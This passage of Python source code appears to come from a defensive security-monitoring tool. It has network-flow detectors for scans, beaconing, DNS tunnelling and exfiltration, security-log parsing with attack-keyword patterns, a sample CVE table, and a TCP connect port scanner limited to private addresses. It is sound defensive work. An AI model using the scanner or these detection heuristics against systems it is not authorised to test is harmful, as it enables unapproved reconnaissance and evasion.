    link = struct.unpack(en + "I", data[20:24])[0]
    pos, evs = 24, []
    while pos + 16 <= len(data) and len(evs) < limit:
        sec, frac, cl, ol = struct.unpack(en + "IIII", data[pos:pos + 16])
        pkt = data[pos + 16:pos + 16 + cl]
        pos += 16 + cl
        off = 14 if link == 1 else 0 if link == 101 else 16 if link == 113 else None
        if off is None or len(pkt) < off + 20:
            continue
        if link == 1 and struct.unpack(">H", pkt[12:14])[0] != 0x0800:
            continue
        ip = pkt[off:]
        if ip[0] >> 4 != 4:
            continue
        ihl = (ip[0] & 15) * 4
        proto = ip[9]
        src, dst = socket.inet_ntoa(ip[12:16]), socket.inet_ntoa(ip[16:20])
        sp = dp = None
        dns = None
        if proto in (6, 17) and len(ip) >= ihl + 8:
            sp, dp = struct.unpack(">HH", ip[ihl:ihl + 4])
            if proto == 17 and (dp == 53 or sp == 53) and len(ip) > ihl + 20:
                try:
                    q, i, labels = ip[ihl + 8 + 12:], 0, []
                    while i < len(q) and q[i] and len(labels) < 20:
                        labels.append(q[i + 1:i + 1 + q[i]].decode("ascii", "replace"))
                        i += q[i] + 1
                    dns = ".".join(labels) or None
                except Exception:
                    dns = None
        evs.append({"ts": sec + frac / (1e9 if nano else 1e6), "src_ip": src, "dst_ip": dst, "src_port": sp, "dst_port": dp,
                    "proto": {6: "tcp", 17: "udp", 1: "icmp"}.get(proto, str(proto)), "bytes_out": float(ol), "dns_query": dns})
    return evs


class NetworkTrafficDetector(EventDetector):
    key, title = "network", "Network Traffic Analysis"
    blurb = ("Flow analytics: port scans & sweeps, C2 beaconing (timing regularity), exfiltration volume, DNS tunnelling, lateral "
             "movement, exposed risky services, and an Isolation Forest over per-host behaviour. Reads CSV/JSON flows or a .pcap.")
    mitre = ["T1046", "T1071", "T1048", "T1021", "T1572"]
    input_help = "A JSON flow {ts, src_ip, dst_ip, dst_port, proto, bytes_out, bytes_in}."
    columns_help = "NetFlow/Zeek/Suricata-style rows: timestamp, src_ip, dst_ip, dst_port, proto, bytes_out/bytes_in, duration, dns_query. Classic .pcap also accepted."

    def reset(self):
        super().reset()
        self.buf = collections.deque(maxlen=40000)
        self._last_scan = 0.0
        self._n = 0

    def observe(self, ev):
        if not ev.get("src_ip") or not (ev.get("dst_ip") or ev.get("dns")):
            return []
        self._t(ev)
        self.buf.append(ev)
        self._n += 1
        if not getattr(self, "_batch", False) and (self._n % 300 == 0 or ev["ts"] - self._last_scan > 20):
            self._last_scan = ev["ts"]
            return self._scan(list(self.buf), live=True)
        return []

    def analyze_table(self, table, limit=200000, threshold=50):
        self._batch = True
        try:
            return super().analyze_table(table, limit, threshold)
        finally:
            self._batch = False

    def finish(self):
        return self._scan(list(self.buf)) if self.buf else []

    def _scan(self, evs, live=False) -> list:
        out = []
        t_end = max((e["ts"] for e in evs), default=now())

        def emit(rule, key, score, why, mit, ent, extra=None):
            if not live or self._once((rule, key), t_end):
                out.append(make_finding(self.key, f"{rule}: {key}", score, why, extra or {}, [mit], verdict=rule.lower(), entity=ent, ts=t_end))
        ports, dsts_by_port = collections.defaultdict(lambda: collections.defaultdict(set)), collections.defaultdict(lambda: collections.defaultdict(set))
        pair: dict = collections.defaultdict(list)
        out_b: collections.Counter = collections.Counter()
        dns_dom: dict = collections.defaultdict(set)
        lateral = collections.defaultdict(set)
        agg = collections.defaultdict(lambda: [0, set(), set(), 0.0, 0.0, 0.0])
        for e in evs:
            s, d, dp = e["src_ip"], e.get("dst_ip"), e.get("dst_port")
            bo = e.get("bytes_out") if e.get("bytes_out") is not None else (e.get("bytes") or 0.0)
            bi = e.get("bytes_in") or 0.0
            a = agg[s]
            a[0] += 1
            a[3] += bo
            a[4] += bi
            a[5] += e.get("dur") or 0
            if d:
                a[1].add(d)
                if dp:
                    a[2].add(dp)
                    ports[s][d].add(dp)
                    dsts_by_port[s][dp].add(d)
                    pair[(s, d, dp)].append(e["ts"])
                if not is_private_ip(d):
                    out_b[s] += bo
                if is_private_ip(s) and is_private_ip(d) and dp in LATERAL_PORTS:
                    lateral[s].add(d)
                if not is_private_ip(s) and is_private_ip(d) and dp in (23, 3389, 445, 5900, 135, 139, 2323):
                    emit("Exposed service probed", f"{s}→{d}:{dp}", 40, [f"Internet host {s} contacted internal {d} on risky port {dp}"],
                         "T1133", s)
            q = e.get("dns")
            if q:
                labs = q.lower().strip(".").split(".")
                if len(labs) >= 3:
                    dns_dom[".".join(labs[-2:])].add(".".join(labs[:-2]))
        for s, dm in ports.items():
            for d, ps in dm.items():
                if len(ps) >= 20:
                    emit("Port scan", f"{s}→{d}", 60 + min(35, len(ps) // 3), [f"{s} probed {len(ps)} distinct ports on {d}"], "T1046", s,
                         {"ports": len(ps)})
        for s, dm in dsts_by_port.items():
            for p, ds in dm.items():
                if len(ds) >= 15:
                    emit("Host sweep", f"{s}:{p}", 58 + min(35, len(ds) // 3), [f"{s} contacted {len(ds)} hosts on port {p}"], "T1046", s,
                         {"hosts": len(ds)})
        for (s, d, dp), ts_ in pair.items():
            if len(ts_) >= 8 and dp not in PERIODIC_OK:
                g = np.diff(np.sort(np.array(ts_)))
                g = g[g > 0]
                if len(g) >= 7 and g.mean() >= 5:
                    cv = float(g.std() / g.mean())
                    mad = float(np.median(np.abs(g - np.median(g))) / max(np.median(g), 1e-9))
                    if cv < 0.25 or mad < 0.08:
                        sc = 58 + (0.25 - min(cv, .25)) / 0.25 * 30 + (6 if not is_private_ip(d) else 0)
                        emit("Beaconing", f"{s}→{d}:{dp}", sc, [f"{len(ts_)} connections every ≈{g.mean():.0f}s (timing jitter {cv * 100:.0f}%) — machine-regular, C2-style"],
                             "T1071", s, {"interval_s": round(float(g.mean()), 1), "count": len(ts_), "dst": d, "port": dp})
        if len(out_b) >= 1:
            vals = np.array(list(out_b.values()))
            med, mad = float(np.median(vals)), float(np.median(np.abs(vals - np.median(vals))) * 1.4826) or max(float(vals.std()), 1.0)
            for s, v in out_b.items():
                z = (v - med) / mad if len(vals) >= 5 else 0
                if v >= 50e6 and (z > 4 or len(vals) < 5):
                    emit("Large outbound transfer", s, 62 + min(30, z), [f"{s} sent {human(v)} to external hosts" + (f" ({z:.0f}σ above peers)" if len(vals) >= 5 else "")],
                         "T1048", s, {"bytes": v})
        for dom, subs in dns_dom.items():
            if len(subs) >= 25:
                mean_len = float(np.mean([len(x) for x in subs]))
                ent = float(np.mean([shannon(x) for x in list(subs)[:200]]))
                if mean_len >= 14 or ent > 3.4:
                    emit("DNS tunnelling", dom, 78 + min(15, len(subs) // 20), [f"{len(subs)} unique sub-domains of {dom} (avg length {mean_len:.0f}, entropy {ent:.1f}) — data hidden in DNS names"],
                         "T1572", dom, {"subdomains": len(subs)})
        for s, ds in lateral.items():
            if len(ds) >= 8:
                emit("Lateral movement", s, 68 + min(25, len(ds)), [f"{s} reached {len(ds)} internal hosts over SMB/RDP/SSH/WinRM"], "T1021", s, {"hosts": len(ds)})
        if len(agg) >= 30:
            keys = list(agg)
            X = np.array([[math.log1p(agg[k][0]), math.log1p(len(agg[k][1])), math.log1p(len(agg[k][2])), math.log1p(agg[k][3]),
                           math.log1p(agg[k][4]), math.log1p(agg[k][5])] for k in keys])
            sc = IsoForest(seed=5).fit(X).score(X)
            for i in np.argsort(-sc)[:3]:
                if sc[i] > 0.68:
                    emit("Anomalous host behaviour", keys[i], 50 + (sc[i] - .68) * 100, [f"{keys[i]}: traffic profile is a statistical outlier among {len(keys)} hosts (iso={sc[i]:.2f})"],
                         "T1046", keys[i])
        return out

    def extras_summary(self, evs, findings):
        pc = collections.Counter(e.get("proto", "?") for e in evs)
        talk = collections.Counter()
        for e in evs:
            talk[e.get("src_ip", "?")] += (e.get("bytes_out") or e.get("bytes") or 0)
        ts = [e["ts"] for e in evs if e.get("ts")]
        return {"flows": len(evs), "protocols": dict(pc.most_common(6)), "top_talkers": [(k, human(v)) for k, v in talk.most_common(5)],
                "unique_src": len({e.get("src_ip") for e in evs}), "unique_dst": len({e.get("dst_ip") for e in evs}),
                "span_s": round(max(ts) - min(ts)) if ts else 0}

    def analyze_pcap(self, data: bytes) -> dict:
        evs = read_pcap(data)
        t = Table([{"ts": e["ts"], "src_ip": e["src_ip"], "dst_ip": e["dst_ip"], "dst_port": e["dst_port"], "proto": e["proto"],
                    "bytes_out": e["bytes_out"], "dns_query": e["dns_query"]} for e in evs], "capture.pcap", sha256b(data), "pcap")
        return self.analyze_table(t)


# ═══════════════════════════════════════════════════════════════════════
#  SECURITY LOG ANALYSIS
# ═══════════════════════════════════════════════════════════════════════
RX_APACHE = re.compile(r'^(\S+) \S+ (\S+) \[([^\]]+)\] "(\S+) (\S+)[^"]*" (\d{3}) (\S+)(?: "([^"]*)" "([^"]*)")?')
RX_SYSLOG = re.compile(r"^(\w{3}\s+\d+\s[\d:]{8})\s+(\S+)\s+([\w./()-]+?)(?:\[(\d+)\])?:\s+(.*)$")
RX_ISO = re.compile(r"^(\d{4}-\d\d-\d\d[T ][\d:.,]+(?:Z|[+-]\d\d:?\d\d)?)\s+(.*)$")
RX_SSH_FAIL = re.compile(r"(?i)Failed (?:password|publickey|keyboard-interactive/pam) for (?:invalid user )?(\S+) from (\S+)")
RX_SSH_OK = re.compile(r"(?i)Accepted (?:password|publickey|keyboard-interactive/pam) for (\S+) from (\S+)")
RX_SSH_INV = re.compile(r"(?i)Invalid user (\S+) from (\S+)")
RX_LEVEL = re.compile(r"\b(EMERG|ALERT|CRIT(?:ICAL)?|FATAL|ERR(?:OR)?|WARN(?:ING)?|NOTICE|INFO|DEBUG)\b", re.I)
ERR_WORDS = re.compile(r"(?i)(fatal|segfault|panic|denied|unauthori[sz]ed|exploit|overflow|corrupt|refused|violation|tamper|rootkit|malware|backdoor|failed)")


def parse_log_line(line: str) -> dict | None:
    line = line.strip()
    if not line:
        return None
    ev: dict = {"msg": line, "raw": {"line": line}}
    if line.startswith("{"):
        try:
            o = json.loads(line)
            if isinstance(o, dict):
                ev = norm_event({nk(k): v for k, v in o.items()})
                ev.setdefault("msg", line)
                return ev
        except ValueError:
            pass
    m = RX_APACHE.match(line)
    if m:
        ip, user, t, meth, path, st, size, ref, ua = m.groups()
        ev.update(src_ip=ip, user=None if user == "-" else user, ts=parse_ts(t), action=meth, resource=urllib.parse.unquote(path),
                  status=int(st), bytes=fnum(size, 0.0), ua=ua or "", fmt="web", success=int(st) < 400 if int(st) in (401, 403) else None)
        ev["msg"] = f'{meth} {urllib.parse.unquote(path)} {st} {ua or ""}'
        return ev
    m = RX_SYSLOG.match(line)
    body = line
    if m:
        ts_s, host, proc, pid, body = m.groups()
        ev.update(ts=parse_ts(ts_s), host=host, proc=proc, msg=body, fmt="syslog")
    else:
        m = RX_ISO.match(line)
        if m:
            ev.update(ts=parse_ts(m.group(1)), msg=m.group(2), fmt="iso")
            body = m.group(2)
    for rx, ok in ((RX_SSH_FAIL, False), (RX_SSH_INV, False), (RX_SSH_OK, True)):
        mm = rx.search(body)
        if mm:
            ev.update(user=mm.group(1), src_ip=mm.group(2), success=ok, action="ssh login")
            break
    else:
        if re.search(r"(?i)authentication failure", body):
            u = re.search(r"user=(\S+)", body)
            ip = re.search(r"rhost=(\S+)", body)
            ev.update(success=False, action="auth", user=u.group(1) if u else None, src_ip=ip.group(1) if ip else None)
        elif re.search(r"(?i)\b(login|logon) (failed|failure)|failed login|invalid (credentials|password)", body):
            ip = IOC_RES["ipv4"].search(body)
            u = re.search(r"(?i)user(?:name)?[=: ]+['\"]?([\w.@-]+)", body)
            ev.update(success=False, action="login", src_ip=ip.group(0) if ip else None, user=u.group(1) if u else None)
    lv = RX_LEVEL.search(line[:200])
    ev["level"] = lv.group(1).upper()[:4] if lv else "INFO"
    return ev


def template_of(msg: str) -> str:
    t = re.sub(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", "<IP>", msg[:300])
    t = re.sub(r"\b[0-9a-fA-F]{8}-[0-9a-fA-F-]{27}\b|\b0x[0-9a-fA-F]+\b|\b[0-9a-fA-F]{12,}\b", "<HEX>", t)
    t = re.sub(r"(['\"]).*?\1", "<S>", t)
    t = re.sub(r"\b\d+\b", "<N>", t)
    return " ".join(t.split()[:14])


class LogAnalysisDetector(EventDetector):
    key, title = "logs", "Security Log Analysis"
    blurb = ("Parses syslog / sshd / Apache-nginx / JSON / ISO-timestamp logs, mines message templates, flags attack signatures, "
             "rare error templates and event bursts, extracts IOCs, and feeds auth failures to the password-attack and IAM engines.")
    mitre = ["T1190", "T1110", "T1562"]
    input_help = "Paste one or more log lines."
    columns_help = "Any .log/.txt file (one event per line) or CSV/JSON with a message/line column."

    def reset(self):
        super().reset()
        self.tpl: collections.Counter = collections.Counter()
        self.n_seen = 0

    def observe(self, ev):
        msg = (ev.get("msg") or "")[:1500]
        if not msg:
            return []
        ts = ev.get("ts") or now()
        out = []
        text = urllib.parse.unquote(msg) if "%" in msg else msg
        hits = [(n, w, t) for n, (rx, w, t) in SIGNATURES.items() if rx.search(text) or (ev.get("ua") and rx.search(str(ev["ua"])))]
        if hits:
            n, w, t = max(hits, key=lambda x: x[1])
            ok_status = ev.get("status", 0) in (404, 400, 403, 401)
            sc = 100 * w * (0.85 if ok_status else 1.0)
            if self._once((n, ev.get("src_ip"), msg[:60]), ts):
                out.append(make_finding(self.key, f"{n} attempt" + (f" from {ev['src_ip']}" if ev.get("src_ip") else ""), sc,
                                        [f"Signature: {n}", f"Line: {msg[:140]}"] + ([f"HTTP {ev['status']}"] if ev.get("status") else []),
                                        {"src_ip": ev.get("src_ip"), "status": ev.get("status")}, [t], verdict=n.lower(),
                                        entity=ev.get("src_ip") or "", ts=ts))
        tp = template_of(msg)
        self.n_seen += 1
        first = self.tpl[tp] == 0
        self.tpl[tp] += 1
        if first and self.n_seen > 200 and ERR_WORDS.search(msg) and self._once(("tpl", tp), ts):
            out.append(make_finding(self.key, "First-seen error message", 48, [f"Never-before-seen log template with error wording: {tp[:100]}"],
                                    {}, ["T1562"], ts=ts))
        return out

    def analyze_table(self, table, limit=300000, threshold=40):
        self.reset()
        evs = []
        for r in table.rows[:limit]:
            line = r.get("line") or r.get("message") or r.get("msg") or r.get("log") or r.get("raw")
            if isinstance(line, str) and set(r) <= {"line", "message", "msg", "log", "raw", "value"}:
                e = parse_log_line(line)
            else:
                e = norm_event(r)
                if e.get("msg") is None:
                    e["msg"] = " ".join(f"{k}={v}" for k, v in list(r.items())[:12])
            if e:
                lv = RX_LEVEL.search(e.get("msg", "")[:200])
                e.setdefault("level", lv.group(1).upper()[:4] if lv else "INFO")
                evs.append(e)
        findings, auth_f = [], []
        pw, iam = self.hub.detectors.get("password"), self.hub.detectors.get("iam")
        if pw:
            pw.reset()
        if iam:
            iam.reset()
        buckets: collections.Counter = collections.Counter()
        fmts, levels = collections.Counter(), collections.Counter()
        fail_ips: collections.Counter = collections.Counter()
        auth_fail = auth_ok = 0
        all_text = []
        for e in evs:
            findings += self.observe(e)
            fmts[e.get("fmt", "json/csv" if e.get("raw") and "line" not in e["raw"] else "text")] += 1
            levels[e.get("level", "INFO")] += 1
            if e.get("ts"):
                buckets[int(e["ts"] // 60)] += 1
            if e.get("success") is not None:
                if e["success"]:
                    auth_ok += 1
                else:
                    auth_fail += 1
                    if e.get("src_ip"):
                        fail_ips[e["src_ip"]] += 1
                if pw:
                    auth_f += pw.observe(dict(e))
                if iam:
                    auth_f += iam.observe(dict(e))
            if len(all_text) < 20000:
                all_text.append(e.get("msg", "")[:300])
        bursts = []
        if len(buckets) >= 10:
            v = np.array(list(buckets.values()), float)
            med, mad = float(np.median(v)), float(np.median(np.abs(v - np.median(v))) * 1.4826) or max(float(v.std()), 1.0)
            for k, c in buckets.items():
                z = (c - med) / mad
                if z > 6 and c >= 20:
                    bursts.append(make_finding(self.key, f"Event burst at {fmt_ts(k * 60)}", min(75, 45 + z), [f"{c} events in one minute vs. typical {med:.0f} ({z:.0f}σ)"],
                                               {"count": c}, ["T1499"], ts=k * 60))
        findings += bursts + auth_f
        if pw:
            pw.reset()
        if iam:
            iam.reset()
        findings = [f for f in findings if f["score"] >= threshold]
        findings.sort(key=lambda f: -f["score"])
        rare = [(t, c) for t, c in self.tpl.items() if c <= 2 and ERR_WORDS.search(t)][:10]
        iocs = extract_iocs("\n".join(all_text))
        self.hub.ti.add_from_iocs(iocs, source=f"logs:{table.name}", base_conf=40 if findings else 15)
        out = {"module": self.key, "dataset": table.name, "rows": len(evs), "flagged": len(findings), "formats": dict(fmts),
               "levels": dict(levels), "templates": len(self.tpl), "top_templates": self.tpl.most_common(8),
               "rare_error_templates": rare, "auth": {"success": auth_ok, "failures": auth_fail,
                                                      "top_failing_ips": fail_ips.most_common(5)},
               "iocs": {k: len(v) for k, v in iocs.items()}, "by_severity": dict(collections.Counter(f["severity"] for f in findings)),
               "mode": "parsers + signatures + statistics", "findings": findings[:300]}
        self.reset()
        return out

    def analyze(self, item, **kw):
        text = item if isinstance(item, str) else dumps(item)
        t = Table([{"line": ln} for ln in text.splitlines() if ln.strip()][:5000], "pasted-log")
        r = self.analyze_table(t)
        if r["findings"]:
            return r["findings"][0]
        return make_finding(self.key, "log lines", 0, [f"{r['rows']} line(s) parsed — no attack signatures or anomalies"], {}, [])


def fmt_ts(ts) -> str:
    try:
        return datetime.datetime.fromtimestamp(ts, UTC).strftime("%Y-%m-%d %H:%M:%SZ")
    except (OverflowError, OSError, ValueError):
        return "?"


# ═══════════════════════════════════════════════════════════════════════
#  VULNERABILITY ASSESSMENT
# ═══════════════════════════════════════════════════════════════════════
def vparse(v) -> tuple:
    s = str(v).lower().strip().lstrip("v")
    pre = False
    m = re.search(r"[-_.]?(alpha|beta|rc|dev|snapshot|pre)", s)
    if m:
        s, pre = s[:m.start()] + re.sub(r"\D", "", s[m.end():])[:0], True
    toks = re.findall(r"\d+|[a-z]", s)
    out, i = [], 0
    while i < len(toks):
        t = toks[i]
        if t.isdigit():
            out.append(int(t))
        elif t == "p" and i + 1 < len(toks) and toks[i + 1].isdigit():
            pass                                   # OpenSSH "8.5p1" → (8,5,1)
        else:
            out.append(ord(t) - 96)                # OpenSSL "1.0.1f" → (1,0,1,6)
        i += 1
    if pre:
        out.append(-1)
    return tuple(out) or (0,)


def vcmp(a: tuple, b: tuple) -> int:
    n = max(len(a), len(b))
    a, b = a + (0,) * (n - len(a)), b + (0,) * (n - len(b))
    return (a > b) - (a < b)


def in_range(ver: str, intro: str | None, fixed: str | None) -> bool:
    v = vparse(ver)
    if intro and vcmp(v, vparse(intro)) < 0:
        return False
    if fixed and vcmp(v, vparse(fixed)) >= 0:
        return False
    return True


VULN_DB = (   # curated sample of well-known, widely documented vulnerabilities (NOT a complete feed — upload yours)
    {"p": r"log4j(-core)?", "cve": "CVE-2021-44228", "cvss": 10.0, "intro": "2.0-beta9", "fixed": "2.15.0", "notable": 1,
     "sum": "Log4Shell – remote code execution via JNDI lookups (upgrade to 2.17.1+ for the follow-up fixes)"},
    {"p": r"openssl", "cve": "CVE-2014-0160", "cvss": 7.5, "intro": "1.0.1", "fixed": "1.0.1g", "notable": 1,
     "sum": "Heartbleed – memory disclosure through the TLS heartbeat extension"},
    {"p": r"openssl", "cve": "CVE-2022-3602", "cvss": 7.5, "intro": "3.0.0", "fixed": "3.0.7", "notable": 0,
     "sum": "X.509 e-mail address buffer overflow in certificate verification"},
    {"p": r"openssh|sshd", "cve": "CVE-2024-6387", "cvss": 8.1, "intro": "8.5", "fixed": "9.8", "notable": 1,
     "sum": "regreSSHion – unauthenticated signal-handler race in sshd (RCE as root on glibc Linux)"},
    {"p": r"(apache )?struts2?", "cve": "CVE-2017-5638", "cvss": 10.0, "intro": "2.3.5", "fixed": "2.3.32", "notable": 1,
     "sum": "Jakarta Multipart parser RCE (Equifax breach)"},
    {"p": r"(apache )?struts2?", "cve": "CVE-2017-5638", "cvss": 10.0, "intro": "2.5.0", "fixed": "2.5.10.1", "notable": 1,
     "sum": "Jakarta Multipart parser RCE (Equifax breach)"},
    {"p": r"spring[- ]?(framework|beans|core)?", "cve": "CVE-2022-22965", "cvss": 9.8, "intro": "5.3.0", "fixed": "5.3.18", "notable": 1,
     "sum": "Spring4Shell – data-binding RCE (JDK 9+, WAR on Tomcat)"},
    {"p": r"spring[- ]?(framework|beans|core)?", "cve": "CVE-2022-22965", "cvss": 9.8, "intro": "5.2.0", "fixed": "5.2.20", "notable": 1,
     "sum": "Spring4Shell – data-binding RCE (JDK 9+, WAR on Tomcat)"},
    {"p": r"(apache )?http(d| server)|apache2", "cve": "CVE-2021-42013", "cvss": 9.8, "intro": "2.4.49", "fixed": "2.4.51", "notable": 1,
     "sum": "Path traversal / RCE in Apache HTTP Server 2.4.49–2.4.50"},
    {"p": r"sudo", "cve": "CVE-2021-3156", "cvss": 7.8, "intro": "1.8.2", "fixed": "1.9.5p2", "notable": 1,
     "sum": "Baron Samedit – heap overflow in sudoedit → local root"},
    {"p": r"curl|libcurl", "cve": "CVE-2023-38545", "cvss": 9.8, "intro": "7.69.0", "fixed": "8.4.0", "notable": 0,
     "sum": "SOCKS5 heap buffer overflow"},
    {"p": r"xz( utils)?|liblzma", "cve": "CVE-2024-3094", "cvss": 10.0, "intro": "5.6.0", "fixed": "5.6.2", "notable": 1,
     "sum": "Backdoored release tarballs (liblzma / sshd supply-chain compromise)"},
    {"p": r"bash", "cve": "CVE-2014-6271", "cvss": 9.8, "intro": "1.0", "fixed": "4.4", "notable": 1,
     "sum": "Shellshock – code execution via crafted environment variables (check distro patch level)"},
)
RISKY_PORTS = {23: ("Telnet (cleartext remote shell)", .8), 21: ("FTP (cleartext credentials)", .55), 3389: ("RDP exposed", .75),
               445: ("SMB exposed (wormable history: EternalBlue)", .8), 139: ("NetBIOS", .5), 5900: ("VNC", .65),
               6379: ("Redis (often unauthenticated)", .8), 27017: ("MongoDB (often unauthenticated)", .8),
               9200: ("Elasticsearch HTTP API", .7), 2375: ("Docker API without TLS = root on the host", .95),
               11211: ("Memcached (amplification / data leak)", .7), 3306: ("MySQL reachable", .5), 5432: ("PostgreSQL reachable", .5),
               1433: ("MS-SQL reachable", .55), 161: ("SNMP (default 'public' community?)", .55), 69: ("TFTP", .6),
               512: ("rexec", .8), 513: ("rlogin", .8), 514: ("rsh/syslog", .5), 5984: ("CouchDB", .6), 8080: ("Alt-HTTP admin consoles", .3)}
DEFAULT_PORTS = (21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 2375, 3000, 3306, 3389, 5000, 5432,
                 5900, 5984, 6379, 8000, 8080, 8443, 9000, 9200, 11211, 27017)


def scan_ports(host: str, ports=None, timeout: float = 0.5) -> dict:
    """TCP connect scan — ONLY loopback / private-range hosts (you must own or be authorised to test them)."""
    try:
        ip = socket.gethostbyname(host)
    except OSError as e:
        raise ValueError(f"cannot resolve {host}: {e}")
    if not is_private_ip(ip):
        raise ValueError("For safety the built-in scanner only targets loopback/private-range addresses. "
                         "Use your own authorised scanner for anything else, then upload its export here.")
    ports = list(ports or DEFAULT_PORTS)[:1024]

    def probe(p):
        try:
            with socket.create_connection((ip, p), timeout=timeout):
                return p
        except OSError:
            return None
    with ThreadPoolExecutor(48) as ex:
        open_ports = sorted(p for p in ex.map(probe, ports) if p)
    return {"host": host, "ip": ip, "open": open_ports, "scanned": len(ports)}


class VulnerabilityDetector(Detector):
    train_label = "📥 Import as CVE feed"
    key, title = "vuln", "Vulnerability Assessment"
    blurb = ("Matches your software inventory against a vulnerability feed (bundled sample + your uploaded NVD/scanner export), "
             "audits risky exposed services, can connect-scan your own loopback/private hosts, and ranks everything by exploitability × exposure × asset value.")
    mitre = ["T1190", "T1210"]
    mode = "table"
    trainable = True
    use_extra = False
    input_help = "'product version' (e.g.  openssl 1.0.1f)  or a JSON {host, product, version, port, exposure}."
    columns_help = ("Inventory: host, product/software, version, port/service, exposure (internet/internal), criticality 1-5. "
                    "Feed upload: product, introduced/version_min, fixed/version_fixed, cve, cvss, summary.")

    def __init__(self, hub):
        self.custom: list = []
        super().__init__(hub)
        try:
            with open(os.path.join(hub.home, "vulns_custom.json"), encoding="utf-8") as f:
                self.custom = json.load(f)
        except Exception:
            pass

    def load_model(self):
        self.model = None

    def feed(self):
        return list(VULN_DB) + self.custom

    def train(self, table, label=None, contamination=0.02):
        cols = set(table.columns)
        pc = next((c for c in ("product", "software", "package", "name", "affected_product") if c in cols), None)
        if "cve" not in cols and "cve_id" not in cols or not pc:
            raise ValueError("A vulnerability feed needs at least 'cve' and 'product' columns "
                             "(plus ideally introduced/version_min, fixed/version_fixed, cvss, summary).")
        out = []
        for r in table.rows[:100000]:
            cve = str(r.get("cve") or r.get("cve_id") or "").strip()
            if not re.fullmatch(r"(?i)CVE-\d{4}-\d{3,7}", cve):
                continue
            out.append({"p": re.escape(str(r[pc]).strip().lower()), "cve": cve.upper(),
                        "cvss": min(10.0, max(0.0, fnum(r.get("cvss") or r.get("cvss_score") or r.get("score"), 5.0))),
                        "intro": str(r.get("introduced") or r.get("version_min") or r.get("affected_min") or "") or None,
                        "fixed": str(r.get("fixed") or r.get("version_fixed") or r.get("fixed_in") or r.get("affected_max_exclusive") or "") or None,
                        "notable": int(str(r.get("exploited") or r.get("known_exploited") or "0").lower() in ("1", "true", "yes")),
                        "sum": str(r.get("summary") or r.get("description") or "")[:200]})
        if not out:
            raise ValueError("No valid CVE rows found in this file.")
        self.custom = out[:50000]
        with open(os.path.join(self.hub.home, "vulns_custom.json"), "w", encoding="utf-8") as f:
            json.dump(self.custom, f)
        self.trained_on = {"dataset": table.name, "sha256": table.sha, "rows": len(out), "ts": now(), "kind": "vuln-feed"}
        self.hub.on_trained(self, self.trained_on, {"entries": len(out)})
        return {"module": self.key, "kind": "vuln-feed", "metrics": {"entries": len(out)}}

    def match(self, product: str, version: str) -> list:
        prod = product.lower().strip()
        hits = []
        for e in self.feed():
            if re.fullmatch(r"(?:.*[\s/_-])?(?:" + e["p"] + r")(?:[\s/_-].*)?", prod) and in_range(version, e.get("intro"), e.get("fixed")):
                hits.append(e)
        seen, uniq = set(), []
        for h in sorted(hits, key=lambda x: -x["cvss"]):
            if h["cve"] not in seen:
                seen.add(h["cve"])
                uniq.append(h)
        return uniq

    @staticmethod
    def priority(cvss, exposed, notable, crit) -> float:
        return clamp(cvss / 10 * 0.55 + (0.2 if exposed else 0.05) + (0.12 if notable else 0) + (crit / 5) * 0.13) * 100

    def row_from(self, item):
        if isinstance(item, dict):
            return {nk(k): v for k, v in item.items()}
        m = re.match(r"\s*([A-Za-z][\w .+-]*?)[\s:/=_-]+v?(\d[\w.\-]*)\s*$", str(item))
        if not m:
            raise ValueError("Use the form  'product version'  e.g.  openssl 1.0.1f")
        return {"product": m.group(1), "version": m.group(2)}

    def _eval_row(self, r) -> list:
        host = str(r.get("host") or r.get("hostname") or r.get("asset") or r.get("ip") or "?")
        prod = str(r.get("product") or r.get("software") or r.get("package") or r.get("name") or "")
        ver = str(r.get("version") or r.get("ver") or "")
        exposure = str(r.get("exposure") or r.get("zone") or r.get("internet_facing") or "").lower()
        exposed = exposure in ("internet", "public", "external", "dmz", "true", "yes", "1")
        crit = clamp(fnum(r.get("criticality") or r.get("asset_value"), 3), 1, 5)
        out = []
        if prod and ver:
            for e in self.match(prod, ver):
                sc = self.priority(e["cvss"], exposed, e.get("notable"), crit)
                out.append(make_finding(self.key, f"{host}: {prod} {ver}", sc,
                                        [f"{e['cve']} (CVSS {e['cvss']}): {e['sum']}", f"Fixed in {e['fixed'] or 'n/a'}" if e.get("fixed") else "No fixed version listed",
                                         "Internet-exposed" if exposed else "Internal asset", "Distros often back-port fixes — confirm the package patch level"],
                                        {"host": host, "cve": e["cve"], "cvss": e["cvss"], "fixed": e.get("fixed"), "exposed": exposed, "criticality": crit},
                                        ["T1190"], verdict="vulnerable", entity=host))
        port = fnum(r.get("port") or r.get("dst_port"))
        svc = str(r.get("service") or "").lower()
        if port and int(port) in RISKY_PORTS:
            d, w = RISKY_PORTS[int(port)]
            sc = clamp(w * (1.0 if exposed else 0.6) * (0.8 + crit / 25)) * 100
            out.append(make_finding(self.key, f"{host}:{int(port)}", sc, [f"Risky service: {d}", "Exposed to the internet" if exposed else "Reachable internally"],
                                    {"host": host, "port": int(port), "exposed": exposed}, ["T1133"], verdict="exposure", entity=host))
        for col, why, w in (("default_password", "Default credentials in use", .9), ("weak_tls", "Weak TLS/SSL configuration", .5),
                            ("smbv1", "SMBv1 enabled (EternalBlue class)", .8), ("eol", "End-of-life software (no security patches)", .6),
                            ("unpatched", "Missing security patches", .6), ("no_mfa", "No MFA on administrative access", .6)):
            if str(r.get(col, "")).lower() in ("1", "true", "yes", "y"):
                out.append(make_finding(self.key, f"{host}: {col}", clamp(w * (1.0 if exposed else 0.75)) * 100, [why],
                                        {"host": host, "config": col}, [], verdict="misconfiguration", entity=host))
        if re.search(r"(?i)sslv[23]|tls ?1\.0|tls ?1\.1", svc):
            out.append(make_finding(self.key, f"{host}: {svc}", 50, ["Deprecated TLS/SSL protocol"], {"host": host}, [], entity=host))
        return out

    def analyze(self, item, **kw):
        fs = self._eval_row(self.row_from(item))
        if fs:
            return max(fs, key=lambda f: f["score"])
        r = self.row_from(item)
        return make_finding(self.key, f"{r.get('product', '?')} {r.get('version', '')}", 0, ["No known vulnerability in the loaded feed "
                                                                                          f"({len(self.feed())} entries). Absence ≠ safe — upload a full feed."], {}, [])

    def analyze_table(self, table, limit=100000, threshold=25):
        fs = []
        for r in table.rows[:limit]:
            fs += self._eval_row(r)
        fs = [f for f in fs if f["score"] >= threshold]
        fs.sort(key=lambda f: -f["score"])
        hosts = collections.Counter(f["entity"] for f in fs)
        return {"module": self.key, "dataset": table.name, "rows": min(len(table), limit), "flagged": len(fs),
